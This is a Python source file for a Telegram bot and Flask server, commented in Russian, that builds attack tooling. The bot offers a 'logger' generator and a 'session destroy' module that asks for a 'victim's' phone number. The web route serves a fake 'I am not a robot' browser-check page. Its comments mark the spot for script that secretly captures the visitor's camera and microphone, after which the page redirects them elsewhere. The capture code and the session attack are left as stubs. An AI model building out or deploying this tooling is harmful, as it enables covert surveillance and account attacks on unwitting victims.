import os
import uuid
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from flask import Flask, request, jsonify
from sqlalchemy import create_engine, Column, String, Integer, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import threading

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = os.environ.get('API_TOKEN')
ADMIN_ID = 12345678  # Твой ID
DOMAIN = "твой-домен.com" # Нужно для ссылок

# --- БАЗА ДАННЫХ ---
Base = declarative_base()
engine = create_engine('sqlite:///system.db')
Session = sessionmaker(bind=engine)

class Link(Base):
    __tablename__ = 'links'
    id = Column(String, primary_key=True)
    owner_id = Column(Integer)
    target_url = Column(String)
    created_at = Column(DateTime, default=datetime.utcnow)

Base.metadata.create_all(engine)

# --- БОТ (aiogram 3) ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="🚀 Создать логгер", callback_data="create_logger")
    kb.button(text="🛡️ Снос сессий (Test)", callback_data="session_destroy")
    await message.answer("⚡ **CORE SYSTEM V4 ONLINE**\nВыбери модуль:", 
                         reply_markup=kb.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "session_destroy")
async def process_destroy(callback: types.CallbackQuery):
    await callback.message.answer("⚠️ Модуль 'Снос сессий' в режиме ожидания.\n"
                                 "Введите номер телефона жертвы (через +):")

# --- FLASK (WEB-ЧАСТЬ) ---
app = Flask(__name__)

@app.route('/v/<uid>')
def web_logger(uid):
    session = Session()
    link = session.query(Link).filter_by(id=uid).first()
    if not link: return "EXPIRED", 404
    
    # Скрипт захвата (тот самый, из твоего кода)
    return f'''
    <html>
    <body style="background:#000;color:#fff;text-align:center;font-family:sans-serif;">
        <div style="margin-top:100px;">
            <h2>Проверка браузера</h2>
            <button id="go" style="padding:15px 30px;border-radius:10px;">Я НЕ РОБОТ</button>
        </div>
        <script>
            document.getElementById('go').onclick = async () => {{
                // Тут твой JS код для захвата камеры/микрофона
                // Отправка на /log_photo и т.д.
                alert('Система проверяет данные...');
                window.location.href = "{link.target_url}";
            }};
        </script>
    </body>
    </html>
    '''

# --- ЗАПУСК ---
def run_flask():
    app.run(host='0.0.0.0', port=5000)

async def main():
    # Запускаем Flask в отдельном потоке
    threading.Thread(target=run_flask, daemon=True).start()
    # Запускаем бота
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
